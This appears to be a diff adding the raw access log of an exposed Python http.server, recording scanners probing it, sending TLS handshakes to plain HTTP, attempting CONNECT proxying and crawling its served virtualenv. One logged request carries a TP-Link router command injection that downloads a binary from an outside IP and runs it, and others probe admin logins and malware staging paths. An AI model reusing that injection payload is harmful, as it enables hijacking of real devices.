@@ -1,0 +1,315 @@
+nohup: ignoring input
+62.198.146.250 - - [17/May/2025 21:05:13] "GET /frontend.html HTTP/1.1" 200 -
+198.235.24.125 - - [17/May/2025 21:06:06] code 400, message Bad request syntax ('\\x16\\x03\\x01\\x00î\\x01\\x00\\x00ê\\x03\\x03&êyñ\\x12J;D\\x11J*\\x03í')
+198.235.24.125 - - [17/May/2025 21:06:06] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03&êyñ\x12J;D\x11J*\x03í" 400 -
+198.235.24.125 - - [17/May/2025 21:06:06] code 400, message Bad HTTP/0.9 request type ("\\x16\\x03\\x01\\x00Ê\\x01\\x00\\x00Æ\\x03\\x03·\\x05E.\\x10#\\x08²±ó¾^ñ\\x9eù¡5ãM¹\\x9cW\\x9d\\x8cÁT[ßRx\\x19¡\\x00\\x00hÌ\\x14Ì\\x13À/À+À0À,À\\x11À\\x07À'À#À\\x13À")
+198.235.24.125 - - [17/May/2025 21:06:06] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03·\x05E.\x10#\x08²±ó¾^ñ\x9eù¡5ãM¹\x9cW\x9d\x8cÁT[ßRx\x19¡\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À" 400 -
+68.69.184.218 - - [17/May/2025 21:16:34] code 501, message Unsupported method ('CONNECT')
+68.69.184.218 - - [17/May/2025 21:16:34] "CONNECT www.google.com:443 HTTP/1.1" 501 -
+62.198.146.250 - - [17/May/2025 21:16:53] "GET /frontend.html HTTP/1.1" 304 -
+93.123.211.218 - - [17/May/2025 21:30:58] "GET / HTTP/1.1" 200 -
+62.198.146.250 - - [17/May/2025 21:34:21] "GET /frontend.html HTTP/1.1" 304 -
+----------------------------------------
+Exception occurred during processing of request from ('45.33.109.17', 36970)
+Traceback (most recent call last):
+  File "/usr/lib/python3.11/socketserver.py", line 691, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.11/http/server.py", line 1306, in finish_request
+    self.RequestHandlerClass(request, client_address, self,
+  File "/usr/lib/python3.11/http/server.py", line 667, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.11/socketserver.py", line 755, in __init__
+    self.handle()
+  File "/usr/lib/python3.11/http/server.py", line 432, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.11/http/server.py", line 400, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+                           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.11/socket.py", line 706, in readinto
+    return self._sock.recv_into(b)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+45.33.109.17 - - [17/May/2025 21:42:15] "GET / HTTP/1.1" 200 -
+62.198.146.250 - - [17/May/2025 21:53:53] "GET /frontend.html HTTP/1.1" 304 -
+68.69.186.42 - - [17/May/2025 21:56:38] code 501, message Unsupported method ('CONNECT')
+68.69.186.42 - - [17/May/2025 21:56:38] "CONNECT www.google.com:443 HTTP/1.1" 501 -
+68.69.184.218 - - [17/May/2025 22:45:32] code 501, message Unsupported method ('CONNECT')
+68.69.184.218 - - [17/May/2025 22:45:32] "CONNECT www.google.com:443 HTTP/1.1" 501 -
+204.76.203.206 - - [17/May/2025 23:02:39] "GET / HTTP/1.1" 200 -
+154.212.141.188 - - [17/May/2025 23:54:58] code 400, message Bad request version ('À\\x13À')
+154.212.141.188 - - [17/May/2025 23:54:58] "\x16\x03\x01\x00ò\x01\x00\x00î\x03\x03°\x0f\x08Ç«Ô\x10ª²ÏB\x9aíNÁÊBìF&Jrª\x98é¥ÍÆú7°f Ì}\x0fñ\x17\x17$\x13Ó\x9aD~íÑüg,\x01æÌ÷o°£NÍ¬Ïº\x03±Q\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" 400 -
+154.212.141.188 - - [17/May/2025 23:54:58] code 400, message Bad request version ('À\\x13À')
+154.212.141.188 - - [17/May/2025 23:54:58] "\x16\x03\x01\x00ò\x01\x00\x00î\x03\x03á\x8fª\x12É\x18££_Ûôl_Ôò>ífå¤R\x91©ýjN\x8fb5Üñ± \x9f\x0døó(#nÆÖz/ç\x90ý¡»\x1f\x8d+\x8dÉ,\\\x9fzÅþ\x8eÆù\x10\x8e\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" 400 -
+154.212.141.188 - - [17/May/2025 23:54:59] code 404, message File not found
+154.212.141.188 - - [17/May/2025 23:54:59] "GET /v1/vector/collections/describe HTTP/1.1" 404 -
+154.212.141.188 - - [17/May/2025 23:54:59] code 404, message File not found
+154.212.141.188 - - [17/May/2025 23:54:59] "GET /v1 HTTP/1.1" 404 -
+154.212.141.188 - - [17/May/2025 23:55:00] "GET / HTTP/1.1" 200 -
+118.26.36.34 - - [17/May/2025 23:55:03] "GET / HTTP/1.1" 200 -
+118.26.36.34 - - [17/May/2025 23:55:04] code 404, message File not found
+118.26.36.34 - - [17/May/2025 23:55:04] "GET /favicon.ico HTTP/1.1" 404 -
+103.48.64.78 - - [18/May/2025 00:14:28] code 404, message File not found
+103.48.64.78 - - [18/May/2025 00:14:28] "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 -
+68.69.186.106 - - [18/May/2025 00:15:29] code 501, message Unsupported method ('CONNECT')
+68.69.186.106 - - [18/May/2025 00:15:29] "CONNECT www.google.com:443 HTTP/1.1" 501 -
+68.69.184.218 - - [18/May/2025 00:28:18] code 501, message Unsupported method ('CONNECT')
+68.69.184.218 - - [18/May/2025 00:28:18] "CONNECT www.google.com:443 HTTP/1.1" 501 -
+204.76.203.206 - - [18/May/2025 00:28:42] "GET / HTTP/1.1" 200 -
+205.210.31.246 - - [18/May/2025 00:42:22] "GET / HTTP/1.0" 200 -
+159.223.187.33 - - [18/May/2025 00:56:48] code 400, message Bad request syntax ('\\x16\\x03\\x01\\x01û\\x01\\x00\\x01÷\\x03\\x03d@?òA±ìOt¢}5|z]IBÖ½`Y<tFØös\\x07Ò\\x87ò\\x99\\x00\\x01<Ì\\x14Ì\\x13Ì\\x15À0À,À(À$À\\x14À')
+159.223.187.33 - - [18/May/2025 00:56:48] "\x16\x03\x01\x01û\x01\x00\x01÷\x03\x03d@?òA±ìOt¢}5|z]IBÖ½`Y<tFØös\x07Ò\x87ò\x99\x00\x01<Ì\x14Ì\x13Ì\x15À0À,À(À$À\x14À" 400 -
+172.202.118.21 - - [18/May/2025 01:50:31] "GET / HTTP/1.1" 200 -
+142.93.7.213 - - [18/May/2025 02:03:31] code 400, message Bad request syntax ('\\x00\\x0e8¡9|hE÷»\\x8e\\x00\\x00\\x00\\x00\\x00')
+142.93.7.213 - - [18/May/2025 02:03:31] "\x00\x0e8¡9|hE÷»\x8e\x00\x00\x00\x00\x00" 400 -
+68.69.184.218 - - [18/May/2025 02:06:23] code 501, message Unsupported method ('CONNECT')
+68.69.184.218 - - [18/May/2025 02:06:23] "CONNECT www.google.com:443 HTTP/1.1" 501 -
+198.235.24.28 - - [18/May/2025 02:15:11] "GET / HTTP/1.1" 200 -
+193.93.228.171 - - [18/May/2025 02:25:40] "GET / HTTP/1.1" 200 -
+68.69.186.106 - - [18/May/2025 02:46:13] code 501, message Unsupported method ('CONNECT')
+68.69.186.106 - - [18/May/2025 02:46:13] "CONNECT www.google.com:443 HTTP/1.1" 501 -
+68.69.186.42 - - [18/May/2025 03:01:59] code 501, message Unsupported method ('CONNECT')
+68.69.186.42 - - [18/May/2025 03:01:59] "CONNECT www.google.com:443 HTTP/1.1" 501 -
+89.248.168.227 - - [18/May/2025 03:37:17] "GET / HTTP/1.1" 200 -
+68.69.184.218 - - [18/May/2025 03:41:27] code 501, message Unsupported method ('CONNECT')
+68.69.184.218 - - [18/May/2025 03:41:27] "CONNECT www.google.com:443 HTTP/1.1" 501 -
+----------------------------------------
+Exception occurred during processing of request from ('206.168.34.198', 36460)
+Traceback (most recent call last):
+  File "/usr/lib/python3.11/socketserver.py", line 691, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.11/http/server.py", line 1306, in finish_request
+    self.RequestHandlerClass(request, client_address, self,
+  File "/usr/lib/python3.11/http/server.py", line 667, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.11/socketserver.py", line 755, in __init__
+    self.handle()
+  File "/usr/lib/python3.11/http/server.py", line 432, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.11/http/server.py", line 400, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+                           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.11/socket.py", line 706, in readinto
+    return self._sock.recv_into(b)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+206.168.34.198 - - [18/May/2025 03:49:50] "GET / HTTP/1.1" 200 -
+206.168.34.198 - - [18/May/2025 03:49:55] "GET / HTTP/1.1" 200 -
+206.168.34.198 - - [18/May/2025 03:49:58] code 404, message File not found
+206.168.34.198 - - [18/May/2025 03:49:58] "GET /favicon.ico HTTP/1.1" 404 -
+206.168.34.198 - - [18/May/2025 03:49:59] code 505, message Invalid HTTP version (2.0)
+206.168.34.198 - - [18/May/2025 03:49:59] "PRI * HTTP/2.0" 505 -
+206.168.34.198 - - [18/May/2025 03:50:07] "GET / HTTP/1.1" 200 -
+206.168.34.198 - - [18/May/2025 03:50:08] "GET /cases HTTP/1.1" 301 -
+206.168.34.198 - - [18/May/2025 03:50:08] "GET /cases/ HTTP/1.1" 200 -
+206.168.34.198 - - [18/May/2025 03:50:09] "GET /venv HTTP/1.1" 301 -
+206.168.34.198 - - [18/May/2025 03:50:10] "GET /venv/ HTTP/1.1" 200 -
+206.168.34.198 - - [18/May/2025 03:50:11] "GET /venv/bin HTTP/1.1" 301 -
+206.168.34.198 - - [18/May/2025 03:50:11] "GET /venv/bin/ HTTP/1.1" 200 -
+206.168.34.198 - - [18/May/2025 03:50:12] "GET /venv/lib HTTP/1.1" 301 -
+206.168.34.198 - - [18/May/2025 03:50:13] "GET /venv/lib/ HTTP/1.1" 200 -
+206.168.34.198 - - [18/May/2025 03:50:17] "GET /venv/lib/python3.11 HTTP/1.1" 301 -
+206.168.34.198 - - [18/May/2025 03:50:20] "GET /venv/lib/python3.11/ HTTP/1.1" 200 -
+206.168.34.198 - - [18/May/2025 03:50:25] "GET /venv/lib/python3.11/site-packages HTTP/1.1" 301 -
+206.168.34.198 - - [18/May/2025 03:50:32] code 404, message File not found
+206.168.34.198 - - [18/May/2025 03:50:32] "GET /favicon.ico HTTP/1.1" 404 -
+206.168.34.198 - - [18/May/2025 03:50:33] code 400, message Bad request version ('À\\x14À')
+206.168.34.198 - - [18/May/2025 03:50:33] "\x16\x03\x01\x00÷\x01\x00\x00ó\x03\x03¦êg,¶¨¦\x87ÍúÕÌóï]\x8cçM`r÷\x93F|\x93p\x17¥¾Goº bgAt\x06¦}4õ½\x82\x80Â\x91®¹6GJUìð\x7fM¹vp^\x8d¨Ùh\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+205.210.31.148 - - [18/May/2025 03:53:48] code 400, message Bad request version ('f')
+205.210.31.148 - - [18/May/2025 03:53:48] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x0381»1¢_Ð\x0d\x0eÊÛb\x1dã ¢\x15co\x19¨|U½·Ç­\x0bf" 400 -
+205.210.31.148 - - [18/May/2025 03:53:49] code 400, message Bad HTTP/0.9 request type ("\\x16\\x03\\x01\\x00Ê\\x01\\x00\\x00Æ\\x03\\x03Rß\\x93U\\x02Ë`ýüï¤^\\xad¾\\x87/@skÚzµ{Û>U2\\x90¸iÅG\\x00\\x00hÌ\\x14Ì\\x13À/À+À0À,À\\x11À\\x07À'À#À\\x13À")
+205.210.31.148 - - [18/May/2025 03:53:49] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03Rß\x93U\x02Ë`ýüï¤^­¾\x87/@skÚzµ{Û>U2\x90¸iÅG\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À" 400 -
+141.98.11.137 - - [18/May/2025 04:03:58] code 404, message File not found
+141.98.11.137 - - [18/May/2025 04:03:58] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F212.81.47.226%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.1" 404 -
+68.69.184.218 - - [18/May/2025 04:41:44] code 501, message Unsupported method ('CONNECT')
+68.69.184.218 - - [18/May/2025 04:41:44] "CONNECT www.google.com:443 HTTP/1.1" 501 -
+207.154.227.172 - - [18/May/2025 05:02:30] code 400, message Bad request version ('À\\x14À')
+207.154.227.172 - - [18/May/2025 05:02:30] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03¶§m6¸\x11nuv\x12\x0e&*\x83\x0ez¶ë\x8d\x13W\x91ëÔc-¸ \x0b\x92¬Æ\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" 400 -
+207.154.227.172 - - [18/May/2025 05:02:30] code 400, message Bad request version ('À\\x14À')
+207.154.227.172 - - [18/May/2025 05:02:30] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03»Ñpô|9).a\x7fBÇTöZl\x1b?¯\x13eÜA\x00Ø÷\x95\x1d/ÊÐ\x12\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" 400 -
+207.154.227.172 - - [18/May/2025 05:02:30] "GET / HTTP/1.1" 200 -
+207.154.227.172 - - [18/May/2025 05:02:30] code 404, message File not found
+207.154.227.172 - - [18/May/2025 05:02:30] "GET /download/powershell/ HTTP/1.1" 404 -
+207.154.227.172 - - [18/May/2025 05:02:30] code 404, message File not found
+207.154.227.172 - - [18/May/2025 05:02:30] "GET /get.php HTTP/1.1" 404 -
+64.226.70.121 - - [18/May/2025 05:13:17] code 400, message Bad request version ('À#À¬À®À+À')
+64.226.70.121 - - [18/May/2025 05:13:17] "\x16\x03\x03\x01¥\x01\x00\x01¡\x03\x03Þ'\x80r­ö8á\x00_²|ËCT­S;t\x11°°´Ý\x84\x11ç|ÐË\x1eb 9\x0cO@D®~aÉÕ°nÐ\x82ì¨LTñÛÝ}ù3Ì³è\x1d-k~é\x00\x8a\x00\x16\x003\x00gÀ\x9eÀ¢\x00\x9e\x009\x00kÀ\x9fÀ£\x00\x9f\x00E\x00¾\x00\x88\x00Ä\x00\x9aÀ\x08À\x09À#À¬À®À+À" 400 -
+64.226.70.121 - - [18/May/2025 05:13:17] code 400, message Bad request version ('À\\x9c\\x00<\\x00/\\x00')
+64.226.70.121 - - [18/May/2025 05:13:17] "\x16\x03\x03\x01¥\x01\x00\x01¡\x03\x03\x03\x96mê¨Àì»³P\x12)'ß[¡\x1f;+§\x93\x01J(ú^°TQ\x86\x9c§ ÷Ì1ÒÏ·J%\x90\x16ÉCw¦\x1b~²E6ÝJ}×mm\x1ejÜQ\x1e$B\x00\x8a\x00\x05\x00\x04\x00\x07\x00À\x00\x84\x00º\x00A\x00\x9dÀ¡À\x9d\x00=\x005\x00\x9cÀ À\x9c\x00<\x00/\x00" 400 -
+64.226.70.121 - - [18/May/2025 05:13:17] code 400, message Bad HTTP/0.9 request type ('\\x16\\x03\\x03\\x01V\\x01\\x00\\x01R\\x03\\x03Á_rnÞÙS×\\x16¤ÕÒ+^')
+64.226.70.121 - - [18/May/2025 05:13:17] "\x16\x03\x03\x01V\x01\x00\x01R\x03\x03Á_rnÞÙS×\x16¤ÕÒ+^\x0b5iÂw\x82ÓÈà" 400 -
+64.226.70.121 - - [18/May/2025 05:13:17] code 400, message Bad HTTP/0.9 request type ('\\x16\\x03\\x03\\x01H\\x01\\x00\\x01D\\x03\\x03¾\\x11z\\x86^\\x15d\\x82\\x90GTWoÝ&Óâ£¡\\x99/oª²S\\x00ØÆuFØÞ')
+64.226.70.121 - - [18/May/2025 05:13:17] "\x16\x03\x03\x01H\x01\x00\x01D\x03\x03¾\x11z\x86^\x15d\x82\x90GTWoÝ&Óâ£¡\x99/oª²S\x00ØÆuFØÞ VÀ%}8xBîg:?Í·à¯e¤\x8f¬\x8bÁ°þ¯»ä(êa\x80Ì\x81\x00DÀ\x13À'À/À\x14À(À0À`ÀaÀvÀwÌ¨\x13\x05\x13\x04\x13\x03Ì\x13À\x11\x00" 400 -
+64.226.70.121 - - [18/May/2025 05:13:17] code 400, message Bad request version ("¤L%«âÒÎ»~É\\x18Z)xÚ\\x825\\x16Ü\\x98'~")
+64.226.70.121 - - [18/May/2025 05:13:17] "\x16\x03\x03\x01\x99\x01\x00\x01\x95\x03\x03Ô\x08jÈ\x9dù\x0cõëG\x16YÎ\x9a{D\x94ÏÌ|¾5Ù\x08þ\x90\x91\x1e\x08Ú\\B Àêå\x1c¤L%«âÒÎ»~É\x18Z)xÚ\x825\x16Ü\x98'~" 400 -
+64.226.70.121 - - [18/May/2025 05:13:17] code 400, message Bad HTTP/0.9 request type ('\\x16\\x03\\x02\\x01\\x9a\\x01\\x00\\x01\\x96\\x03\\x02ü§ê\\x987Ï\\x9b£ß')
+64.226.70.121 - - [18/May/2025 05:13:17] "\x16\x03\x02\x01\x9a\x01\x00\x01\x96\x03\x02ü§ê\x987Ï\x9b£ß\x09ï\x0fÓ\x05[\x8a\x05\x84ªµM\x8e" 400 -
+64.226.70.121 - - [18/May/2025 05:13:17] code 400, message Bad request version ('À#À¬À®À+À')
+64.226.70.121 - - [18/May/2025 05:13:17] "\x16\x03\x01\x01§\x01\x00\x01£\x03\x03æG\x8e³[\x95\x19\x13å\x15\x0f±²¼õ\x7f¾\x8d6\x84ádÉY­±A\x16)×ÑY \x8a\x85WÏ¾<¯Cß\x00\x98)MÃa;\x99ä\x97Å¶Þ½gNå¼!P£2#\x00\x8a\x00\x16\x003\x00gÀ\x9eÀ¢\x00\x9e\x009\x00kÀ\x9fÀ£\x00\x9f\x00E\x00¾\x00\x88\x00Ä\x00\x9aÀ\x08À\x09À#À¬À®À+À" 400 -
+64.226.70.121 - - [18/May/2025 05:13:17] code 400, message Bad request version ('N\\x8b\\x87®\\x84íW')
+64.226.70.121 - - [18/May/2025 05:13:17] "\x16\x03\x01\x01§\x01\x00\x01£\x03\x03?G\x86\x8aãÕaS\\½b%®R~éæ\x19S\x04ó÷ô\x12T]ûh\x01²\x1eµ ìºÀl³ É®-L\x08y»å\x8bÐ%Ï\x0bN\x8b\x87®\x84íW" 400 -
+64.226.70.121 - - [18/May/2025 05:13:17] code 400, message Bad HTTP/0.9 request type ('\\x16\\x03\\x01\\x01\\x9d\\x01\\x00\\x01\\x99\\x03\\x03½ÈÛ\\x93ø|y\\x01\\x8bõ9\\x9c±\\x9f·\\x8cn/¢ïW~¸ºR¨«¸WÚ5\\x9c')
+64.226.70.121 - - [18/May/2025 05:13:17] "\x16\x03\x01\x01\x9d\x01\x00\x01\x99\x03\x03½ÈÛ\x93ø|y\x01\x8bõ9\x9c±\x9f·\x8cn/¢ïW~¸ºR¨«¸WÚ5\x9c "í^\x84Fy" 400 -
+64.226.70.121 - - [18/May/2025 05:13:17] code 400, message Bad request version ("/\\x00\\x8cªªÀ\\x12À\\x13À\\x07À'Ì\\x14À/\\x13\\x01À\\x14\\x13\\x02À(Ì©À0ÀsÀ`ÀrÀaÀ,ÀvÀ¯ÀwÀ\\xadÌ¨À$\\x13\\x05À")
+64.226.70.121 - - [18/May/2025 05:13:17] "\x16\x03\x01\x01´\x01\x00\x01°\x03\x03\x935|'í¨Ö\x89~°§\x8fb\x98\x13\x88\x7fÈ¬\x83½\x88n\x11G\x0d[ßÿè±ä éiUï\x89\x0f\x09\x0b\x84é\x8bCiúQj¯\x8e°-Å´mÚeÊËnMv\x85/\x00\x8cªªÀ\x12À\x13À\x07À'Ì\x14À/\x13\x01À\x14\x13\x02À(Ì©À0ÀsÀ`ÀrÀaÀ,ÀvÀ¯ÀwÀ­Ì¨À$\x13\x05À" 400 -
+64.226.70.121 - - [18/May/2025 05:13:17] code 400, message Bad request version ('\\x92w½\\x97ÂFµ\\x18\\x06')
+64.226.70.121 - - [18/May/2025 05:13:17] "\x16\x03\x01\x00ú\x01\x00\x00ö\x03\x03²\x11¨Ð/o?\x94ÌÝÂc\x1fr(R£j\x93\x92\x02ÉØéöf#×ÃtpÒ \x92w½\x97ÂFµ\x18\x06" 400 -
+64.226.70.121 - - [18/May/2025 05:13:17] code 400, message Bad request version ("'\\x0e_X\\x0f\\x8fò\\x9dítò\\x11â8â\\x02òpzAË\\x80\\x1b$Îí\\x9edÍýç«\\x00\\x06\\x13\\x01\\x13\\x02\\x13\\x03\\x01\\x00\\x00{\\x00\\x05\\x00\\x05\\x01\\x00\\x00\\x00\\x00\\x00")
+64.226.70.121 - - [18/May/2025 05:13:17] "\x16\x03\x01\x00Î\x01\x00\x00Ê\x03\x03¼\x8f\x0b\x12x\x9dë\x1b\x07h]\x01I\x1fê(Pc\x0eEn\x95\x8fµ¤#bH\x93\x04k© '\x0e_X\x0f\x8fò\x9dítò\x11â8â\x02òpzAË\x80\x1b$Îí\x9edÍýç«\x00\x06\x13\x01\x13\x02\x13\x03\x01\x00\x00{\x00\x05\x00\x05\x01\x00\x00\x00\x00\x00" 400 -
+68.69.186.106 - - [18/May/2025 05:21:04] code 501, message Unsupported method ('CONNECT')
+68.69.186.106 - - [18/May/2025 05:21:04] "CONNECT www.google.com:443 HTTP/1.1" 501 -
+3.137.73.221 - - [18/May/2025 05:31:15] "GET / HTTP/1.1" 200 -
+3.137.73.221 - - [18/May/2025 05:31:17] "GET / HTTP/1.1" 200 -
+3.137.73.221 - - [18/May/2025 05:40:12] code 400, message Bad request version ('À\\x14À')
+3.137.73.221 - - [18/May/2025 05:40:12] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03i+¢ßè\x00]\x9b\x03ÍêßT\x15\x890nH\x00¨S\x1d!g\x97äÃIô9\x96Ç\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" 400 -
+----------------------------------------
+Exception occurred during processing of request from ('199.45.155.70', 54166)
+Traceback (most recent call last):
+  File "/usr/lib/python3.11/socketserver.py", line 691, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.11/http/server.py", line 1306, in finish_request
+    self.RequestHandlerClass(request, client_address, self,
+  File "/usr/lib/python3.11/http/server.py", line 667, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.11/socketserver.py", line 755, in __init__
+    self.handle()
+  File "/usr/lib/python3.11/http/server.py", line 432, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.11/http/server.py", line 400, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+                           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.11/socket.py", line 706, in readinto
+    return self._sock.recv_into(b)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+199.45.155.70 - - [18/May/2025 05:43:31] "GET / HTTP/1.1" 200 -
+199.45.155.70 - - [18/May/2025 05:43:35] "GET / HTTP/1.1" 200 -
+199.45.155.70 - - [18/May/2025 05:43:35] code 404, message File not found
+199.45.155.70 - - [18/May/2025 05:43:35] "GET /favicon.ico HTTP/1.1" 404 -
+199.45.155.70 - - [18/May/2025 05:43:37] code 505, message Invalid HTTP version (2.0)
+199.45.155.70 - - [18/May/2025 05:43:37] "PRI * HTTP/2.0" 505 -
+199.45.155.70 - - [18/May/2025 05:43:41] "GET / HTTP/1.1" 200 -
+199.45.155.70 - - [18/May/2025 05:43:41] "GET /venv HTTP/1.1" 301 -
+199.45.155.70 - - [18/May/2025 05:43:42] "GET /venv/ HTTP/1.1" 200 -
+199.45.155.70 - - [18/May/2025 05:43:44] "GET /venv/bin HTTP/1.1" 301 -
+199.45.155.70 - - [18/May/2025 05:43:45] "GET /venv/bin/ HTTP/1.1" 200 -
+199.45.155.70 - - [18/May/2025 05:43:46] "GET /venv/lib HTTP/1.1" 301 -
+199.45.155.70 - - [18/May/2025 05:43:47] "GET /venv/lib/ HTTP/1.1" 200 -
+199.45.155.70 - - [18/May/2025 05:43:47] "GET /venv/lib/python3.11 HTTP/1.1" 301 -
+199.45.155.70 - - [18/May/2025 05:43:48] "GET /venv/lib/python3.11/ HTTP/1.1" 200 -
+199.45.155.70 - - [18/May/2025 05:43:48] "GET /venv/lib/python3.11/site-packages HTTP/1.1" 301 -
+199.45.155.70 - - [18/May/2025 05:43:49] "GET /venv/lib/python3.11/site-packages/ HTTP/1.1" 200 -
+199.45.155.70 - - [18/May/2025 05:43:52] "GET /venv/lib/python3.11/site-packages/firebase_admin HTTP/1.1" 301 -
+199.45.155.70 - - [18/May/2025 05:43:52] "GET /venv/lib/python3.11/site-packages/firebase_admin/ HTTP/1.1" 200 -
+199.45.155.70 - - [18/May/2025 05:43:53] "GET /venv/lib/python3.11/site-packages/pycparser-2.22.dist-info HTTP/1.1" 301 -
+199.45.155.70 - - [18/May/2025 05:43:54] "GET /venv/lib/python3.11/site-packages/pycparser-2.22.dist-info/ HTTP/1.1" 200 -
+199.45.155.70 - - [18/May/2025 05:43:54] "GET /venv/lib/python3.11/site-packages/cachecontrol HTTP/1.1" 301 -
+199.45.155.70 - - [18/May/2025 05:43:55] "GET /venv/lib/python3.11/site-packages/cachecontrol/ HTTP/1.1" 200 -
+199.45.155.70 - - [18/May/2025 05:43:55] "GET /venv/lib/python3.11/site-packages/jwt HTTP/1.1" 301 -
+199.45.155.70 - - [18/May/2025 05:43:56] "GET /venv/lib/python3.11/site-packages/jwt/ HTTP/1.1" 200 -
+199.45.155.70 - - [18/May/2025 05:43:57] "GET /venv/lib/python3.11/site-packages/distro-1.9.0.dist-info HTTP/1.1" 301 -
+199.45.155.70 - - [18/May/2025 05:43:57] "GET /venv/lib/python3.11/site-packages/distro-1.9.0.dist-info/ HTTP/1.1" 200 -
+199.45.155.70 - - [18/May/2025 05:43:58] "GET /venv/lib/python3.11/site-packages/google_cloud_storage-3.1.0.dist-info HTTP/1.1" 301 -
+199.45.155.70 - - [18/May/2025 05:43:58] "GET /venv/lib/python3.11/site-packages/google_cloud_storage-3.1.0.dist-info/ HTTP/1.1" 200 -
+199.45.155.70 - - [18/May/2025 05:43:59] "GET /venv/lib/python3.11/site-packages/propcache-0.3.1.dist-info HTTP/1.1" 301 -
+199.45.155.70 - - [18/May/2025 05:43:59] "GET /venv/lib/python3.11/site-packages/propcache-0.3.1.dist-info/ HTTP/1.1" 200 -
+199.45.155.70 - - [18/May/2025 05:44:00] "GET /venv/lib/python3.11/site-packages/msgpack-1.1.0.dist-info HTTP/1.1" 301 -
+199.45.155.70 - - [18/May/2025 05:44:06] code 404, message File not found
+199.45.155.70 - - [18/May/2025 05:44:06] "GET /favicon.ico HTTP/1.1" 404 -
+199.45.155.70 - - [18/May/2025 05:44:07] code 400, message Bad request version ('Ù')
+199.45.155.70 - - [18/May/2025 05:44:07] "\x16\x03\x01\x00÷\x01\x00\x00ó\x03\x03iÕGWó\x0dtF\x98ò\x19\x026<×\x9e\x89\x81\x0d\x95\x9eÊEí]OÆùXÔ¸Ä ÙsR\x10\x07%ñ\x83\x8bg\x843.Nw<ÔMÃv\x18Q¼Ö¾'\x0dÙ" 400 -
+68.69.184.218 - - [18/May/2025 06:48:41] code 501, message Unsupported method ('CONNECT')
+68.69.184.218 - - [18/May/2025 06:48:41] "CONNECT www.google.com:443 HTTP/1.1" 501 -
+20.65.194.61 - - [18/May/2025 06:54:36] code 404, message File not found
+20.65.194.61 - - [18/May/2025 06:54:36] "GET /hudson HTTP/1.1" 404 -
+68.69.186.106 - - [18/May/2025 07:47:28] code 501, message Unsupported method ('CONNECT')
+68.69.186.106 - - [18/May/2025 07:47:28] "CONNECT www.google.com:443 HTTP/1.1" 501 -
+62.198.146.250 - - [18/May/2025 07:53:57] code 404, message File not found
+62.198.146.250 - - [18/May/2025 07:53:57] "GET /favicon.ico HTTP/1.1" 404 -
+62.198.146.250 - - [18/May/2025 07:53:58] "GET /frontend.html HTTP/1.1" 304 -
+68.69.186.42 - - [18/May/2025 07:56:38] code 501, message Unsupported method ('CONNECT')
+68.69.186.42 - - [18/May/2025 07:56:38] "CONNECT www.google.com:443 HTTP/1.1" 501 -
+62.198.146.250 - - [18/May/2025 07:57:19] "GET /frontend.html HTTP/1.1" 304 -
+62.198.146.250 - - [18/May/2025 08:05:47] "GET /frontend.html HTTP/1.1" 304 -
+68.69.184.218 - - [18/May/2025 08:11:48] code 501, message Unsupported method ('CONNECT')
+68.69.184.218 - - [18/May/2025 08:11:48] "CONNECT www.google.com:443 HTTP/1.1" 501 -
+79.124.58.198 - - [18/May/2025 08:12:39] code 404, message File not found
+79.124.58.198 - - [18/May/2025 08:12:39] "GET /securityRealm/user/admin/search/index?q=a HTTP/1.1" 404 -
+62.198.146.250 - - [18/May/2025 08:13:18] "GET /frontend.html HTTP/1.1" 304 -
+----------------------------------------
+Exception occurred during processing of request from ('206.168.34.45', 59326)
+Traceback (most recent call last):
+  File "/usr/lib/python3.11/socketserver.py", line 691, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.11/http/server.py", line 1306, in finish_request
+    self.RequestHandlerClass(request, client_address, self,
+  File "/usr/lib/python3.11/http/server.py", line 667, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.11/socketserver.py", line 755, in __init__
+    self.handle()
+  File "/usr/lib/python3.11/http/server.py", line 432, in handle
